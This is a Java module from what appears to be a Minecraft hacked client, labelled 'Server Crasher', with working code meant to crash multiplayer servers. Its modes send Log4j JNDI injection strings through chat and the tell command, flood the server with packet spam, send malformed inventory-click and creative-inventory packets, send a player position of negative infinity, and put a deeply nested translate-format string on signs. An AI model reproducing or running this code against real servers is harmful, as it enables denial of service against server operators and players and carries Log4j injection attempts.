package com.shroomclient.shroomclientnextgen.modules.impl.player;

import com.shroomclient.shroomclientnextgen.config.ConfigChild;
import com.shroomclient.shroomclientnextgen.config.ConfigMode;
import com.shroomclient.shroomclientnextgen.config.ConfigOption;
import com.shroomclient.shroomclientnextgen.config.ConfigParentId;
import com.shroomclient.shroomclientnextgen.events.SubscribeEvent;
import com.shroomclient.shroomclientnextgen.events.impl.MotionEvent;
import com.shroomclient.shroomclientnextgen.events.impl.PacketEvent;
import com.shroomclient.shroomclientnextgen.modules.Module;
import com.shroomclient.shroomclientnextgen.modules.ModuleCategory;
import com.shroomclient.shroomclientnextgen.modules.ModuleManager;
import com.shroomclient.shroomclientnextgen.modules.RegisterModule;
import com.shroomclient.shroomclientnextgen.modules.impl.client.Notifications;
import com.shroomclient.shroomclientnextgen.util.*;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import java.time.Instant;
import java.util.BitSet;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.entity.Entity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.message.ArgumentSignatureDataMap;
import net.minecraft.network.message.LastSeenMessageList;
import net.minecraft.network.packet.c2s.common.CommonPongC2SPacket;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.screen.slot.SlotActionType;
import org.apache.commons.lang3.RandomStringUtils;

@RegisterModule(
    name = "Server Crasher",
    uniqueId = "servercrasher",
    description = "Crashes Servers",
    category = ModuleCategory.Player
)
public class Crasher extends Module {

    private static final String TEXT =
        "{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
        "\"with\":[\"\",{\"translate\":\"%2$s%2$s%2$s%2$s%2$s\"," +
        "\"with\":[\"a\", \"a\"]}]}]}]}]}]}]}";

    @ConfigMode
    @ConfigParentId("mode")
    @ConfigOption(name = "Mode", description = "", order = 1)
    public static Mode mode = Mode.Packet_Spam;

    @ConfigChild(value = "mode", parentEnumOrdinal = 0)
    @ConfigOption(
        name = "Send Chat Exploit",
        description = "Send Log4j Exploit Through Chat",
        order = 2
    )
    public Boolean sendChatExploit = true;

    @ConfigChild(value = "mode", parentEnumOrdinal = 0)
    @ConfigOption(
        name = "Send Tell Exploit",
        description = "Send Log4j Exploit Through Tell Command",
        order = 3
    )
    public Boolean sendTellExploit = true;

    @ConfigChild(value = "mode", parentEnumOrdinal = 2)
    @ConfigOption(
        name = "Vulcan",
        description = "Turn Off If Your Using On Vulcan Server",
        order = 5
    )
    public Boolean vulcan = true;

    int yay = 0;

    @Override
    protected void onEnable() {
        if (C.p() != null) {
            ChatUtil.sendPrefixMessage("Attack Sending");
        }
    }

    @Override
    protected void onDisable() {
        if (C.p() != null) {
            ChatUtil.sendPrefixMessage("Attack Stopped");
        }
    }

    @SubscribeEvent
    public void onMotionPre(MotionEvent.Pre e) {
        switch (mode) {
            case Log4j -> {
                yay++;
                if (
                    yay >
                    C.mc.getNetworkHandler().getPlayerList().toArray().length
                ) {
                    yay = 0;
                }
                if (
                    ((PlayerListEntry) C.mc
                            .getNetworkHandler()
                            .getPlayerList()
                            .toArray()[yay]).getProfile()
                        .getName() ==
                    C.p().getName().toString()
                ) {
                    yay++;
                }
                if (sendChatExploit) {
                    if (MovementUtil.ticks % 20 == 0) {
                        C.mc
                            .getNetworkHandler()
                            .sendChatMessage(
                                RandomStringUtils.randomAlphabetic(4) +
                                generateLog4j() +
                                RandomStringUtils.randomAlphabetic(4)
                            );
                    }
                }
                if (sendTellExploit) {
                    PacketUtil.sendPacket(
                        new CommandExecutionC2SPacket(
                            "tell" +
                            " " +
                            RandomStringUtils.randomAlphabetic(4) +
                            generateLog4j(),
                            Instant.now(),
                            System.currentTimeMillis(),
                            ArgumentSignatureDataMap.EMPTY,
                            new LastSeenMessageList.Acknowledgment(
                                0,
                                new BitSet()
                            )
                        ),
                        false
                    );
                    Notifications.notify(
                        "Tell Command Sent",
                        ThemeUtil.themeColors()[0],
                        1
                    );
                    sendTellExploit = false;
                }
            }
            case Paper_Window -> {
                for (int i = 0; i < 6; i++) {
                    PacketUtil.sendPacket(
                        new ClickSlotC2SPacket(
                            C.p().playerScreenHandler.syncId,
                            C.p().playerScreenHandler.getRevision(),
                            36,
                            -1,
                            SlotActionType.SWAP,
                            C.p().playerScreenHandler.getCursorStack().copy(),
                            Int2ObjectMaps.singleton(
                                0,
                                new ItemStack(
                                    Items.WAXED_EXPOSED_CUT_COPPER_STAIRS
                                )
                            )
                        ),
                        true
                    );
                }
            }
            case Packet_Spam -> {
                PacketUtil.sendPacket(
                    new PlayerMoveC2SPacket.Full(
                        C.p().getX(),
                        C.p().getY(),
                        C.p().getZ(),
                        C.p().getYaw(),
                        C.p().getPitch(),
                        C.p().isOnGround()
                    ),
                    false
                );
                PacketUtil.sendPacket(
                    new RenameItemC2SPacket("Mushroom"),
                    false
                );
                PacketUtil.sendPacket(new CommonPongC2SPacket(1), false);
                PacketUtil.sendPacket(
                    new CreativeInventoryActionC2SPacket(
                        36,
                        new ItemStack(Items.WAXED_EXPOSED_CUT_COPPER_STAIRS)
                    ),
                    false
                );
                if (vulcan) {
                    PacketUtil.sendPacket(
                        new ClickSlotC2SPacket(
                            C.p().playerScreenHandler.syncId,
                            C.p().playerScreenHandler.getRevision(),
                            36,
                            -1,
                            SlotActionType.SWAP,
                            C.p().playerScreenHandler.getCursorStack().copy(),
                            Int2ObjectMaps.singleton(
                                0,
                                new ItemStack(Items.GOLDEN_CARROT)
                            )
                        ),
                        true
                    );
                    for (Entity player : C.w().getEntities()) {
                        if (
                            player != C.p() &&
                            (player != null && player.isAttackable())
                        ) {
                            if (MovementUtil.ticks % 5 == 0) {
                                PacketUtil.sendPacket(
                                    new PlayerInteractEntityC2SPacket(
                                        player.getId(),
                                        false,
                                        PlayerInteractEntityC2SPacket.ATTACK
                                    ),
                                    false
                                );
                            }
                        }
                    }
                }
            }
            case Negative_Infinity -> {
                PacketUtil.sendPacket(
                    new PlayerMoveC2SPacket.PositionAndOnGround(
                        Double.NEGATIVE_INFINITY,
                        Double.NEGATIVE_INFINITY,
                        Double.NEGATIVE_INFINITY,
                        true
                    ),
                    false
                );
                ModuleManager.setEnabled(Crasher.class, false, true);
            }
        }
    }

    @SubscribeEvent
    public void onPacket(PacketEvent.Send.Pre e) {
        switch (mode) {
            case Sign -> {
                Object original = e.getPacket();
                if (original instanceof UpdateSignC2SPacket) {
                    UpdateSignC2SPacket originalPacket =
                        (UpdateSignC2SPacket) e.getPacket();
                    PacketUtil.sendPacket(
                        new UpdateSignC2SPacket(
                            originalPacket.getPos(),
                            originalPacket.isFront(),
                            TEXT,
                            "",
                            "",
                            ""
                        ),
                        false
                    );
                    e.cancel();
                }
            }
        }
    }

    private String generateLog4j() {
        String p3 =
            "192.168." +
            (int) (Math.random() * 254 + 1) +
            "." +
            (int) (Math.random() * 254 + 1);
        return "${" + "jndi" + ":" + "ldap" + "://" + p3 + "}";
    }

    public enum Mode {
        Log4j,
        Paper_Window,
        Packet_Spam,
        Sign,
        Negative_Infinity,
    }
}
